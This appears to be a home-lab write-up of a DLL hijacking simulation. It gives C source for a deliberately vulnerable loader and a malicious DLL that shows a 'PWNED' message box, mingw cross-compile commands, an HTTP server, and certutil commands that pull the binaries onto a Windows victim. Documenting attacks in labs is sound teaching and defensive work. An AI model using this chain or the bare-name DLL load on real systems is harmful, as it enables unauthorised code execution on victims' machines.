# 02 — Attack Simulation

All commands are captured exactly as run. Kali host = `butch@butch`, observed IP **192.168.100.107** (HTTP server on TCP/80). Victim = `DESKTOP-F0JVTQT` (`winhome01`, 192.168.100.108), user `bryll`, PowerShell working directory `C:\Users\Public\hijack`.

## Step 1 — Write the vulnerable application and malicious DLL (Kali)

`vulnapp.c` — loads `hijackme.dll` by bare name (the vulnerability):

```c
#include <windows.h>
void main(){ LoadLibraryA("hijackme.dll"); }
```

`evil.c` — compiled to `hijackme.dll`; `DllMain` runs on attach and pops proof-of-execution:

```c
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r){
    if(reason==DLL_PROCESS_ATTACH)
        MessageBoxA(NULL, "DLL Hijack OK - code executed", "PWNED", 0x40);
    return TRUE;
}
```

→ `evidence/01-payload.png`

## Step 2 — Cross-compile for Windows (Kali)

```bash
i686-w64-mingw32-gcc vulnapp.c -o vulnapp.exe
i686-w64-mingw32-gcc -shared evil.c -o hijackme.dll
ls -la vulnapp.exe hijackme.dll
```

Result (exact sizes, built `Nov 11 10:58` Kali local):

| File | Size (bytes) |
|---|---|
| `hijackme.dll` | 87,775 |
| `vulnapp.exe` | 122,421 |

→ `evidence/02-kali-binaries-built.png`

## Step 3 — Serve the binaries over HTTP (Kali)

```bash
sudo python3 -m http.server 80
# serves vulnapp.exe + hijackme.dll at http://192.168.100.107/
```

## Step 4 — Download both files onto the victim with certutil LOLBin (victim PowerShell)

```powershell
mkdir C:\Users\Public\hijack
cd C:\Users\Public\hijack
certutil -urlcache -split -f http://192.168.100.107/vulnapp.exe C:\Users\Public\hijack\vulnapp.exe
certutil -urlcache -split -f http://192.168.100.107/hijackme.dll C:\Users\Public\hijack\hijackme.dll
dir
```

`certutil` output confirms full transfer: `vulnapp.exe` `01de35` hex = 122,421 bytes; `hijackme.dll` `0156df` hex = 87,775 bytes — matching the Kali build sizes exactly.

`dir` on victim:

```
Directory: C:\Users\Public\hijack
Mode   LastWriteTime       Length   Name
-a---  11/11/2026 8:01 AM   87775   hijackme.dll
-a---  11/11/2026 8:01 AM  122421   vulnapp.exe
```

→ `evidence/03-win-binaries-planted.png`

## Step 5 — Execute the vulnerable app → DLL hijack fires (victim)

```powershell
C:\Users\Public\hijack\vulnapp.exe
```

`LoadLibraryA("hijackme.dll")` resolves to the attacker DLL in the same directory; `DllMain` → `DLL_PROCESS_ATTACH` → MessageBox appears:

- **Title:** `PWNED`
- **Body:** `DLL Hijack OK - code executed`

→ `evidence/04-win-payload-executed.png`

## What the attacker achieved

Arbitrary code execution in the context of `DESKTOP-F0JVTQT\bryll`, delivered as a DLL side-loaded by an unsigned EXE dropped through a LOLBin. No exploit, no privilege escalation — pure execution-flow hijack.
